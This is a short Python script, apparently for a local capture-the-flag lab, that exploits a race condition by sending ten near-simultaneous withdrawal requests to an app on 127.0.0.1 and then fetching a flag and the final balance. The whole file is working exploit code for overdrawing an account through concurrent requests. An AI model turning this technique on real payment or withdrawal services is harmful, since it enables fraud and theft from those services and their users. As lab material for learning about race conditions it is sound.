# exploit.py
# Run after app.py is running: python exploit.py
import requests
import threading
import time

TARGET = "http://127.0.0.1:5000/withdraw"
BALANCE = "http://127.0.0.1:5000/balance"
FLAG = "http://127.0.0.1:5000/get-flag"

NUM_THREADS = 10
AMOUNT = 100  # Each thread tries to withdraw this amount

successes = []
failures = []

def worker(i):
    try:
        r = requests.post(TARGET, json={"amount": AMOUNT}, timeout=5)
        if r.ok:
            print(f"[T{i}] OK {r.json()}")
            successes.append(r.json())
        else:
            print(f"[T{i}] FAIL {r.status_code} {r.text}")
            failures.append((i, r.status_code, r.text))
    except Exception as e:
        print(f"[T{i}] ERR {e}")
        failures.append((i, str(e)))

def main():
    # Show initial balance
    print("Initial balance:", requests.get(BALANCE).json())

    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(i,))
        threads.append(t)

    # Start all threads almost simultaneously
    for t in threads:
        t.start()
        # minimal spacing to increase race chance; you may tune/remove
        time.sleep(0.001)

    for t in threads:
        t.join()

    print("Done. Checking flag endpoint:")
    print(requests.get(FLAG).json())
    print("Final balance:", requests.get(BALANCE).json())

if __name__ == "__main__":
    main()
